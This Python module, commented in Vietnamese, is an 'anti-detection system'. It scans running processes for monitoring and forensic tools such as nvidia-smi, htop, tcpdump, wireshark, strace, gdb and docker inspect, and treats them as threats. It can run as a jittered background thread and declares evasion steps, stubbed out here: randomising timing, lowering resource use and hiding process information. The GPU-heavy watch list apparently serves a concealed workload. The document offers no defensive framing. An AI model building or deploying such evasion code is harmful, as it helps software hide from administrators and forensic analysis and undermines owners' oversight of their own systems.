#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module anti_detection.py - Phát hiện và phản ứng với các công cụ giám sát.

Chức năng chính:
- Phát hiện các công cụ giám sát (monitoring tools) trên hệ thống
- Đánh giá mức độ đe dọa dựa trên các công cụ được phát hiện
- Cung cấp cơ chế giám sát liên tục và thông báo khi phát hiện mối đe dọa
- Triển khai các biện pháp đối phó với công cụ giám sát
"""

import os
import re
import time
import random
import logging
import threading
import subprocess
from typing import List, Dict, Any, Optional, Callable


class AntiDetectionSystem:
    """Hệ thống phát hiện và né tránh các công cụ giám sát"""
    
    def __init__(self, logger=None):
        """
        Khởi tạo AntiDetectionSystem
        
        Args:
            logger: Logger để ghi log
        """
        self.logger = logger or logging.getLogger(__name__)
        self.current_threat_level = "LOW"  # LOW, MEDIUM, HIGH
        self._detected_tools = []
        self._stop_monitoring = False
        self._monitoring_thread = None
        
        # Danh sách các công cụ giám sát cần phát hiện
        self.monitoring_tools = {
            # Công cụ giám sát GPU
            "nvidia-smi": {"pattern": r"nvidia-smi", "threat_level": "HIGH", "type": "gpu"},
            "nvtop": {"pattern": r"nvtop", "threat_level": "MEDIUM", "type": "gpu"},
            "gpustat": {"pattern": r"gpustat", "threat_level": "MEDIUM", "type": "gpu"},
            
            # Công cụ giám sát hệ thống
            "htop": {"pattern": r"htop", "threat_level": "MEDIUM", "type": "system"},
            "top": {"pattern": r"top\s", "threat_level": "MEDIUM", "type": "system"},
            "ps": {"pattern": r"ps\s+(aux|eww|f)", "threat_level": "MEDIUM", "type": "system"},
            "glances": {"pattern": r"glances", "threat_level": "MEDIUM", "type": "system"},
            
            # Công cụ giám sát file/network
            "lsof": {"pattern": r"lsof", "threat_level": "MEDIUM", "type": "file"},
            "tcpdump": {"pattern": r"tcpdump", "threat_level": "HIGH", "type": "network"},
            "wireshark": {"pattern": r"wireshark|tshark", "threat_level": "HIGH", "type": "network"},
            
            # Bộ công cụ forensic
            "strace": {"pattern": r"strace", "threat_level": "HIGH", "type": "syscall"},
            "ltrace": {"pattern": r"ltrace", "threat_level": "HIGH", "type": "library"},
            "gdb": {"pattern": r"gdb", "threat_level": "HIGH", "type": "debug"},
        }
        
        # Khởi động background monitor thread nếu được yêu cầu
        if os.environ.get("ENABLE_THREAT_MONITORING", "0") == "1":
            self.continuous_threat_monitoring()

    def detect_monitoring_tools(self) -> List[Dict[str, Any]]:
        """
        Phát hiện các công cụ giám sát đang chạy trên hệ thống
        
        Returns:
            List[Dict]: Danh sách các công cụ giám sát được phát hiện với thông tin chi tiết
        """
        detected = []
        
        try:
            # Lấy danh sách tiến trình
            ps_output = subprocess.check_output(
                ["ps", "aux"], stderr=subprocess.DEVNULL, universal_newlines=True
            )
            
            # Tìm các công cụ giám sát trong danh sách tiến trình
            for tool_name, tool_info in self.monitoring_tools.items():
                if re.search(tool_info["pattern"], ps_output):
                    tool_detail = {
                        "name": tool_name,
                        "threat_level": tool_info["threat_level"],
                        "type": tool_info["type"],
                        "timestamp": time.time()
                    }
                    detected.append(tool_detail)
                    
            # Thêm phát hiện docker inspect/exec (giám sát container)
            docker_commands = ["docker inspect", "docker exec", "docker stats"]
            for cmd in docker_commands:
                if cmd in ps_output:
                    detected.append({
                        "name": cmd,
                        "threat_level": "HIGH",
                        "type": "container",
                        "timestamp": time.time()
                    })
                    
            # Thêm phát hiện các công cụ monitor khác
            if "nethogs" in ps_output:
                detected.append({
                    "name": "nethogs",
                    "threat_level": "MEDIUM", 
                    "type": "network",
                    "timestamp": time.time()
                })
        
        except Exception as e:
            self.logger.warning(f"Không thể phát hiện công cụ giám sát: {e}")
        
        # Cập nhật danh sách công cụ đã phát hiện
        self._detected_tools = detected
        return detected

    def assess_threat_level(self, detected_tools: List[Dict[str, Any]] = None) -> str:
        """
        Đánh giá mức độ đe dọa dựa trên các công cụ được phát hiện
        
        Args:
            detected_tools: Danh sách công cụ giám sát được phát hiện (nếu None sẽ phát hiện lại)
            
        Returns:
            str: Mức độ đe dọa ("LOW", "MEDIUM", "HIGH")
        """
        if detected_tools is None:
            detected_tools = self.detect_monitoring_tools()
        
        if not detected_tools:
            return "LOW"
        
        # Tìm mức đe dọa cao nhất
        threat_levels = [tool["threat_level"] for tool in detected_tools]
        
        if "HIGH" in threat_levels:
            return "HIGH"
        elif "MEDIUM" in threat_levels:
            return "MEDIUM"
        else:
            return "LOW"

    def continuous_threat_monitoring(self, callback_function: Optional[Callable] = None, 
                                    interval: int = 30) -> None:
        """
        Bắt đầu giám sát liên tục để phát hiện công cụ giám sát
        
        Args:
            callback_function: Hàm callback được gọi khi phát hiện mối đe dọa mới
            interval: Thời gian giữa các lần quét (giây)
        """
        def _monitoring_task():
            self.logger.info("Bắt đầu giám sát mối đe dọa theo dõi...")
            previous_threats = []
            
            while not self._stop_monitoring:
                try:
                    # Phát hiện công cụ giám sát
                    current_threats = self.detect_monitoring_tools()
                    current_names = [t["name"] for t in current_threats]
                    previous_names = [t["name"] for t in previous_threats]
                    
                    # Kiểm tra mối đe dọa mới
                    new_threats = [t for t in current_names if t not in previous_names]
                    
                    if new_threats:
                        # Cập nhật mức đe dọa
                        new_level = self.assess_threat_level(current_threats)
                        old_level = self.current_threat_level
                        self.current_threat_level = new_level
                        
                        # Ghi log và gọi callback nếu có
                        self.logger.warning(f"Phát hiện công cụ giám sát mới: {new_threats}")
                        self.logger.warning(f"Mức đe dọa thay đổi: {old_level} -> {new_level}")
                        
                        if callback_function:
                            try:
                                callback_function(new_threats)
                            except Exception as e:
                                self.logger.error(f"Lỗi khi gọi callback: {e}")
                    
                    # Cập nhật danh sách trước đó
                    previous_threats = current_threats
                    
                    # Thời gian ngủ với nhiễu ngẫu nhiên
                    jitter = random.uniform(0.8, 1.2)  
                    sleep_time = int(interval * jitter)
                    time.sleep(sleep_time)
                    
                except Exception as e:
                    self.logger.error(f"Lỗi trong quá trình giám sát mối đe dọa: {e}")
                    time.sleep(interval)
        
        # Dừng thread giám sát hiện tại nếu có
        self.stop_monitoring()
        
        # Bắt đầu thread giám sát mới
        self._stop_monitoring = False
        self._monitoring_thread = threading.Thread(
            target=_monitoring_task, daemon=True
        )
        self._monitoring_thread.start()
        return self._monitoring_thread  # Trả về thread để có thể join() nếu cần

    def stop_monitoring(self) -> None:
        """Dừng giám sát liên tục nếu đang chạy"""
        if self._monitoring_thread and self._monitoring_thread.is_alive():
            self._stop_monitoring = True
            self._monitoring_thread.join(timeout=1.0)
            self.logger.info("Đã dừng giám sát mối đe dọa")

    def get_current_threat_level(self) -> str:
        """Lấy mức độ đe dọa hiện tại"""
        return self.current_threat_level

    def get_detected_tools(self) -> List[Dict[str, Any]]:
        """Lấy danh sách các công cụ giám sát được phát hiện gần đây nhất"""
        return self._detected_tools

    def apply_evasion_techniques(self) -> bool:
        """
        Áp dụng các biện pháp né tránh giám sát dựa trên mức độ đe dọa hiện tại
        
        Returns:
            bool: True nếu áp dụng thành công, False nếu thất bại
        """
        try:
            threat_level = self.get_current_threat_level()
            
            if threat_level == "LOW":
                # Các biện pháp cơ bản
                self._randomize_process_timing()
                
            elif threat_level == "MEDIUM":
                # Các biện pháp trung bình
                self._randomize_process_timing()
                self._reduce_resource_usage()
                
            elif threat_level == "HIGH":
                # Các biện pháp mạnh
                self._randomize_process_timing()
                self._reduce_resource_usage(aggressive=True)
                self._obscure_process_information()
            
            self.logger.info(f"Đã áp dụng biện pháp né tránh cho mức đe dọa {threat_level}")
            return True
            
        except Exception as e:
            self.logger.error(f"Lỗi khi áp dụng biện pháp né tránh: {e}")
            return False

    def _randomize_process_timing(self) -> None:
        """Làm nhiễu thời gian hoạt động của tiến trình để né tránh phân tích thống kê"""
        # Giả lập việc thực hiện, thực tế sẽ triển khai tùy theo nhu cầu
        pass

    def _reduce_resource_usage(self, aggressive: bool = False) -> None:
        """Giảm sử dụng tài nguyên để né tránh phát hiện"""
        # Giả lập việc thực hiện, thực tế sẽ triển khai tùy theo nhu cầu
        pass

    def _obscure_process_information(self) -> None:
        """Ẩn thông tin tiến trình để né tránh phát hiện"""
        # Giả lập việc thực hiện, thực tế sẽ triển khai tùy theo nhu cầu
        pass


# Hàm trợ giúp để khởi tạo và sử dụng AntiDetectionSystem
def create_anti_detection_system(logger=None) -> AntiDetectionSystem:
    """Tạo một instance của AntiDetectionSystem"""
    return AntiDetectionSystem(logger)

def get_system_threat_level(anti_detection: Optional[AntiDetectionSystem] = None) -> str:
    """Lấy mức độ đe dọa hệ thống hiện tại"""
    if anti_detection is None:
        anti_detection = create_anti_detection_system()
    return anti_detection.get_current_threat_level()


# Kiểm tra khi chạy trực tiếp
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    detector = AntiDetectionSystem()
    print("Phát hiện công cụ giám sát...")
    tools = detector.detect_monitoring_tools()
    if tools:
        print(f"Phát hiện {len(tools)} công cụ:")
        for tool in tools:
            print(f"  - {tool['name']} (Mức đe dọa: {tool['threat_level']})")
    else:
        print("Không phát hiện công cụ giám sát")
    
    print(f"Mức đe dọa hiện tại: {detector.get_current_threat_level()}") 